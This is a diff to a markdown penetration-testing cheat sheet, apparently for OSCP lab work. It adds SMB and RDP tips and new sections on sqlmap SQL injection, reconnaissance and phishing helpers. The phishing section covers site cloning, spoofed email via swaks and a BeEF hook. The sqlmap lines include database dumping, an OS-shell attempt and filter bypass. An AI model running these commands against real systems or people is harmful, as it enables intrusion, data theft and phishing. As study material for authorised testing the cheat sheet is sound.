@@ -23,6 +23,9 @@ flowchart TD
     S3 --> S4["4. File Transfer"]
     S4 --> S5["5. PrivEsc"]
     S5 --> S6["6. Password Attacks"]
+    S6 --> S7["7. SQL Injection"]
+    S7 --> S8["8. Recon extras"]
+    S8 --> S9["9. Phishing helpers"]
 ```
 
 ---
@@ -50,7 +53,10 @@ flowchart TD
 > smbclient //$IP/share -N              # connect to a share
 > enum4linux -a $IP                     # everything: users, shares, OS, policy
 > crackmapexec smb $IP -u '' -p ''      # null auth check
+> rpcclient -U '' -N $IP                # RPC session (enumdomusers, queryuser, etc.)
+> smbmap -H $IP -u '' -p ''             # share permissions at a glance (R/W per share)
 > ```
+> 🔗 `smbclient //$IP/share -c 'put file'` (no `-N`/`-U`) defaults to your **local Kali username** — if that account doesn't exist on the target, you'll get `NT_STATUS_ACCESS_DENIED` even with the right target creds intended. Always pass `-N` for anonymous or `-U user%pass` explicitly.
 
 > [!example] Other services
 > ```bash
@@ -63,6 +69,9 @@ flowchart TD
 > ```bash
 > xfreerdp /v:$IP /u:<user> /p:<pass>              # standard connection
 > xfreerdp /v:$IP /u:<user> /p:<pass> /cert:ignore  # skip cert warnings
+> xfreerdp /v:$IP /u:<user> /p:<pass> /clipboard    # share clipboard (paste text/code in)
+> xfreerdp /v:$IP /u:<user> /p:<pass> /drive:kali,/home/user   # share a local folder as \\tsclient\kali
+> xfreerdp /v:$IP /u:<user> /p:<pass> /dynamic-resolution /gfx:AVC420   # smoother/faster rendering
 > rdesktop $IP -u <user> -p <pass>                  # older alternative
 > ```
 > 🔗 `rdesktop` often **fails** against a non-domain-joined Windows target with NLA enabled (the default on Windows 11) — use `xfreerdp` instead, it handles that combination correctly.
@@ -174,6 +183,68 @@ flowchart TD
 > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 > ```
 > 🔗 Identify a hash type: `hashid '<hash>'` · hashcat mode list at [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+---
+
+## 🗄️ 7. SQL Injection (sqlmap)
+
+> [!example]
+> ```bash
+> sqlmap -u "http://$IP/page?id=1" --batch --dbs             # GET param, list databases
+> sqlmap -r request.txt --batch --dbs                        # from a saved Burp request (POST/cookies/headers intact)
+> sqlmap -u "http://$IP/page?id=1" -D dbname --tables         # tables in a DB
+> sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump # dump a table
+> sqlmap -u "http://$IP/page?id=1" --os-shell                 # attempt OS-level shell
+> sqlmap -u "http://$IP/page?id=1" --level=5 --risk=3         # more aggressive detection
+> sqlmap -u "http://$IP/page?id=1" --tamper=space2comment     # WAF/keyword-filter bypass
+> ```
+> 🔗 `-r request.txt` is almost always the more reliable option over `-u` for anything beyond a trivial GET — save the request from Burp (right-click → Copy to file) so cookies, headers, and POST body all travel with it.
+
+---
+
+## 🔎 8. Recon & fingerprinting extras
+
+> [!example] Output parsing + fingerprinting
+> ```bash
+> nmap -oA scan $IP && xsltproc scan.xml -o scan.html   # save nmap in all formats, render a browsable HTML report
+> whatweb -a 3 http://$IP                                # CLI Wappalyzer equivalent (no GUI needed)
+> ffuf -u http://$IP/FUZZ -w wordlist.txt -mc 200,301,403  # faster gobuster alternative
+> dig any $IP; dig axfr @$IP <domain>; dig +short $IP    # DNS enum one-liners
+> snmp-check $IP; snmpbulkwalk -c public -v2c $IP .      # SNMP alternatives to snmpwalk
+> exiftool -r -a -u -csv *.pdf > metadata.csv            # bulk/recursive metadata extraction to CSV
+> ```
+
+> [!example] TLS / headers without a third-party site
+> ```bash
+> curl -I https://$IP                     # response headers only
+> curl -sI https://$IP | grep -i strict   # check for a specific header (HSTS shown)
+> testssl.sh $IP                          # full TLS/cipher audit, offline
+> sslscan $IP                             # faster, lighter TLS overview
+> openssl s_client -connect $IP:443 -showcerts   # raw cert chain inspection
+> ```
+> 🔗 SSL Labs / securityheaders.com / Netcraft can't reach lab or internal IPs — these are the local equivalents for OSCP targets.
+
+> [!example] OSINT one-liners
+> ```bash
+> gitleaks detect --source ./repo -v      # scan a cloned repo for leaked secrets
+> shodan search 'org:"Target Inc"'        # requires `shodan init <API-KEY>` first
+> whois -h whois.iana.org $DOMAIN         # whois via a specific server
+> curl https://rdap.org/domain/$DOMAIN    # RDAP — WHOIS's structured-JSON successor
+> searchsploit <service> <version>        # local Exploit-DB search
+> ```
+
+---
+
+## 🎣 9. Phishing & client-side helpers
+
+> [!example]
+> ```bash
+> wget --mirror --convert-links --page-requisites --no-parent https://target.com   # clone a site keeping working relative links
+> swaks --to victim@target.com --from you@yours.com --server $SMTP_IP --header "Subject: ..." --body "..."   # send mail from the CLI
+> dnstwist target.com                     # generate + check lookalike/typosquat domains
+> idn2 xn--pple-43d.com                   # decode a punycode homograph domain — see [[🔣 Encoding Reference]]
+> beef-xss                                # start BeEF; default hook: http://$LHOST:3000/hook.js, UI on :3000/ui/panel
+> ```
 
 ---
 
